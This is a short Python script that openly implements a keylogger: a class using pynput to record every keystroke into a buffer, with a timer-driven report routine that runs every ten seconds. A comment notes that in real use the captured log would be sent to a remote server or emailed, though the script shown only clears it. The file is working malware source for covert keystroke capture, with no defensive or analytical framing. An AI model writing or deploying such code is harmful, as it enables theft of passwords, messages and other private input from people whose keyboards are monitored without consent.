#!/usr/bin/env python

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""  # Initialize an empty string to store the keystrokes

    def append_to_log(self, string):
        self.log += string  # Append the pressed key to the log
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)  # Get the character of the pressed key
            
        except AttributeError:
            if key == key.space:
                current_key = " "  # Handle space key
            else:
                current_key =  " " + str(key) + " "  # Handle special keys    
        self.append_to_log(current_key)
        
    def report(self):
        self.log = ""  # Reset the log after reporting
        timer = threading.Timer(10, self.report)  # Set a timer to call the report function every 10 seconds
        timer.start()  # Start the timer
        # Note: In a real-world scenario, you would send the log to a remote server or email it.

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()  # Start the report function
            keyboard_listener.join()

